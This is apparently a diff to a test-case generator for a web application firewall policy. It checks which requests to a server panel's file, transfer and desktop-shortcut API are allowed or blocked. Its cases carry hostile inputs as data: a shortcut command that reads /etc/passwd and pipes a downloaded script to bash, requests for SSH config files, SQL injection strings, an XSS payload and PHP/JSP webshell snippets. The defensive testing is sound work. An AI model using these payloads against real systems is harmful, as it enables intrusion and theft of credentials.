@@ -112,6 +112,34 @@ def cases():
         add('desktop-window-'+path,'PUT','/api/v1/settings/preferences',{'expectedResourceVersion':'fixture','desktop':{'mode':'desktop','windows':[{'id':1,'path':path,'geometry':{'left':0,'top':0,'width':800,'height':600},'minimized':False,'maximized':False,'snap':'','z':1}],'windowSizes':[{'path':path,'width':800,'height':600}],'sideSplitRatio':0.5,'focusedId':1}})
     add('desktop-command-and-file','PUT','/api/v1/desktop/workspace',{'expectedResourceVersion':'fixture','shortcuts':[{'id':'a'*32,'name':'terminal shortcut','targetType':'command','command':'cat /etc/passwd; curl https://example.org/setup.sh | bash','hostId':'local'},{'id':'b'*32,'name':'file shortcut','targetType':'file','path':'/etc/passwd'}],'positions':{'nav:/docker':{'x':0,'y':0}},'labels':{'nav:/docker':'Docker'},'hiddenEntryKeys':['nav:/docker'],'hiddenWidgetKeys':[],'groups':[]})
     add('file-batch-entry','POST','/api/v1/files/entries',{'paths':['/home/web','/etc/passwd','/root/.ssh/config']})
+    filename='0017.\u6b4c\u624b--\u6b4c\u66f2 (live).mp3'
+    receive='/api/v1/files/transfer/sessions'
+    for path,body in [(receive,{'operation':'create','input':{'name':filename}}),
+                      ('/api/v1/files/actions',{'action':'mkdir','name':filename}),
+                      ('/api/v1/files/archive-jobs',{'operation':'create','input':{'name':filename}})]:
+        add('literal-filename-'+path,'POST',path,body)
+    add('literal-filename-entry-prefix','POST','/entry_123'+receive,{'input':{'name':filename}})
+    add('literal-filename-generic-contract','POST','/api/upload-meta',{'file':{'name':filename}},host='generic.example')
+    add('literal-filename-no-implicit-generic-trust','POST',receive,{'input':{'name':filename}},403,host='generic.example')
+    for method in ['GET','PUT','PATCH']:
+        add('literal-filename-wrong-method-'+method,method,receive,{'input':{'name':filename}},403)
+    for path in [receive+'-other',receive+'/extra',receive.replace('/api/','/%61pi/'),receive.replace('/api/','//api/')]:
+        add('literal-filename-route-boundary-'+path,'POST',path,{'input':{'name':filename}},403)
+    add('literal-filename-cross-site','POST',receive,{'input':{'name':filename}},403,host='other.example')
+    add('literal-filename-unrelated-field','POST',receive,{'input':{'name':filename,'directory':"1' UNION SELECT password FROM users--"}},403)
+    add('literal-filename-unrelated-query','POST',receive+'?q=1%27%20UNION%20SELECT%20password%20FROM%20users--',{'input':{'name':filename}},403)
+    add('literal-filename-query-collision','POST',receive+'?json.input.name=1--',{'input':{'name':filename}},403)
+    add('literal-filename-method-override','POST',receive,{'input':{'name':filename}},403,{'X-HTTP-Method-Override':'PUT'})
+    add('literal-filename-body-method-override','POST',receive,{'input':{'name':filename},'_method':'PUT'},403)
+    add('literal-filename-content-encoding','POST',receive,{'input':{'name':filename}},403,{'Content-Encoding':'gzip'})
+    add('literal-filename-wrong-media','POST',receive,{'input':{'name':filename}},403,{'Content-Type':'text/plain'})
+    add('literal-filename-invalid-json','POST',receive,b'{broken',400)
+    duplicate='{"input":{"name":'+json.dumps(filename)+',"name":'+json.dumps(filename)+'}}'
+    add('literal-filename-duplicate-key','POST',receive,duplicate.encode(),403)
+    for label,value in [('slash','0017.\u6b4c\u624b--/b.mp3'),('backslash','0017.\u6b4c\u624b--\\b.mp3'),
+                        ('long','0017.\u6b4c\u624b--'+'a'*256+'.mp3')]:
+        add('literal-filename-invalid-component-'+label,'POST',receive,{'input':{'name':value}},403)
+    add('literal-filename-xss-stays-inspected','POST',receive,{'input':{'name':'<script>alert(1)</script>.mp3'}},403)
     for content in ['<?php system("id"); ?>','<%@ page import="java.lang.*" %><% Runtime.getRuntime().exec("id"); %>']:
         add('file-source-code-'+content[:5],'PUT','/api/v1/files/content?path=/tmp/source.txt',{'content':content,'expectedResourceVersion':'fixture'})
     add('file-java-metadata-stays-inspected','PUT','/api/v1/files/content?path=/tmp/source.txt',{'content':'safe','expectedResourceVersion':'java.lang.Runtime.getRuntime().exec("id")'},403)
@@ -270,6 +298,7 @@ def main():
     profiles={'panel.example':'kpanel','servercache.example':'kpanel','locationcache.example':'kpanel','generic.example':'generic','api.example':'api','cms.example':'wordpress','forum.example':'flarum','upload.example':'upload','stream.example':'streaming'}
     config=json.loads((bundle/'example-policy.json').read_text());config.update(mode='on',cdn='direct',sites={name:{'profile':profile}for name,profile in profiles.items()})
     config['sites']['generic.example']['sourceText']=[{'method':'POST','path':'/api/source-note','fields':['content']}]
+    config['sites']['generic.example']['fileMetadata']=[{'method':'POST','path':'/api/upload-meta','fields':['file.name']}]
     config['sites']['generic.example']['exclusions']=[{'ruleId':rule,'path':'/raw.example/acme/project/main/compose/.env','target':'REQUEST_FILENAME'}for rule in [1110,930130]]
     config['sites']['generic.example']['exclusions'] += [{'ruleId':1110,'path':'/'+scheme+'://raw.example/acme/.repo/main/file','target':'REQUEST_FILENAME'}for scheme in ['http','https']]
     for host in ['generic.example', 'cms.example']:
